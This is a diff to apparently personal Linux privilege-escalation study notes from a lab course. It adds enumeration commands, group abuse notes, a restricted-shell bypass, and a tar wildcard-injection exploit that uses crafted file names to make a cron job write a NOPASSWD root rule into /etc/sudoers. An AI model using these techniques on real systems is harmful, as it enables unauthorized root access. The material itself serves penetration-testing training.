@@ -20,9 +20,48 @@
 * `find / -writable -type d 2>/dev/null` : Find world-writeable folders
 * `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders
 * `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit
+* `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` SUID
+* `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` SGID
 * `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student` - file all hidden files
 * `find / -type d -name ".*" -ls 2>/dev/null` - all hidden dirs
 * `ls -l /tmp /var/tmp /dev/shm` - tmp files
+* Installed packages
+```bash
+apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
+```
+* configs
+```bash
+find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
+```
+* scripts
+```bash
+find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
+```
+
+##### Groups
+adm
+Members of the adm group are able to read all logs stored in /var/log. 
+
+Disk
+Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1,
+
+
+##### Wildcard abuse
+tar exampl
+```bash
+# crontab
+*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
+# abusing
+htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
+htb-student@NIX02:~$ echo "" > --checkpoint=1
+```
+
+##### Restricted shell
+https://vk9-sec.com/linux-restricted-shell-bypass/
+```bash
+ssh htb-user@10.129.205.109 -t "bash --noprofile"
+```
 ##### Automated tools
 - **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 - **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
@@ -94,7 +133,7 @@ Show ports in use:
 ```bash
 ss -tnl
 
-ss -tunlp` to find hidden ports
+ss -tunlp 
 ```
 Display default service for each port in use:
 ```bash
